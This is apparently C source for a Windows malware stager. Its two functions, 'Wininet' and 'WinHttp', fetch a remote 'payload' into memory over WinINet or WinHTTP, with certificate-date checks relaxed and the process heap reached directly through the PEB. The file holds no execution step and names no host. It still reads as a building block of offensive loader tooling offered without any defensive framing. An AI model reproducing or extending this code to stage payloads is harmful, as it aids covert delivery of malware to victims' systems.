#include <Windows.h>

BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	HMODULE hWnet = LoadLibraryW(L"wininet.dll");


	BOOL		bSTATE        = TRUE;

	HINTERNET	hInternet     = NULL,
		        hInternetFile = NULL;

	DWORD		dwBytesRead   = NULL;

	SIZE_T	   	sSize         = NULL;
	PBYTE		pBytes        = NULL,
		        pTmpBytes     = NULL;


	hInternet = InternetOpenA(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		MemCopy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		MemSet(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

void WinHttp( _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize ) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    WCHAR wMethodRequest[] = L"GET";
    
    BOOL  bResults      = FALSE;
    DWORD dwSize       = 0;
    DWORD dwDownloaded = 0;
    BYTE* pTempBuffer  = NULL;

    PVOID Heap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        goto END;
    }

    hConnect = WinHttpConnect(hSession, Host, Port, 0);
    if (!hConnect) {
        goto END;
    }

    hRequest = WinHttpOpenRequest(hConnect, wMethodRequest, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        goto END;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        goto END;
    }

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        goto END;
    }

    DWORD dwContentLength = 0;
    DWORD dwSizeSize = sizeof(DWORD);
    bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSizeSize, NULL);
    if (!bResults) {
        goto END;
    }

    pTempBuffer = (BYTE*)RtlAllocateHeap(Heap, 0, dwContentLength);
    if (!pTempBuffer) {
        goto END;
    }

    do {
        bResults = WinHttpReadData(hRequest, (LPVOID)(pTempBuffer + dwDownloaded), dwContentLength - dwDownloaded, &dwSize);
        if (bResults) {
            dwDownloaded += dwSize;
        } else {
            RtlFreeHeap(Heap, 0, pTempBuffer);
            pTempBuffer = NULL; // Ensure pTempBuffer is NULL if allocation fails
            goto END;
        }
    } while (dwSize > 0 && dwDownloaded < dwContentLength);

    *ByteCodes = pTempBuffer;
    *ByteSize = dwContentLength;

END:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}
